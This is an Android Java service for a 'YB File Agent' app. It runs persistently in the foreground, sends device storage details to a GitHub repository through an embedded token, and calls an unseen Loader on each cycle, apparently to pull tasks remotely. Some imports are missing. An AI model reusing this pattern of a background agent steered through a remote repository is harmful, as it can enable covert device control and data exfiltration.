package com.yb.fa;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;

public class WorkerService extends Service {
    public static volatile boolean run = true;
    public static volatile String last = "";
    Thread t;

    @Override public void onCreate() {
        super.onCreate();
        notif();
        t = new Thread(new Runnable() {
            public void run() {
                GitHub gh = new GitHub(Cfg.TOKEN, Cfg.REPO);
                while (run) {
                    try {
                        JSONObject hb = new JSONObject();
                        hb.put("ts", System.currentTimeMillis());
                        hb.put("agent", "ybfa-1.1-hot");
                        try {
                            File r = Environment.getExternalStorageDirectory();
                            hb.put("root", r.getAbsolutePath());
                            hb.put("freeMB", r.getFreeSpace() / 1048576);
                        } catch (Exception e) {}
                        hb.put("loader", Loader.log);
                        gh.putFile("status/heartbeat.json", hb.toString());
                    } catch (Throwable e) {}
                    try {
                        Loader.tick(WorkerService.this, gh);
                        last = System.currentTimeMillis() + " | " + Loader.log;
                    } catch (Throwable e) {
                        last = "err " + e;
                    }
                    try { Thread.sleep(Cfg.INTERVAL_MS); } catch (Exception e) { break; }
                }
            }
        });
        t.start();
    }

    void notif() {
        try {
            NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            String ch = "ybfa";
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                nm.createNotificationChannel(new NotificationChannel(ch, "YB File Agent", NotificationManager.IMPORTANCE_LOW));
            }
            Notification.Builder b = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                    ? new Notification.Builder(this, ch) : new Notification.Builder(this);
            b.setContentTitle("YB File Agent").setContentText("后台运行中").setSmallIcon(android.R.drawable.stat_sys_upload);
            startForeground(1, b.build());
        } catch (Exception e) {}
    }

    @Override public int onStartCommand(Intent i, int f, int s) { return START_STICKY; }
    @Override public IBinder onBind(Intent i) { return null; }
    @Override public void onDestroy() { run = false; super.onDestroy(); }
}
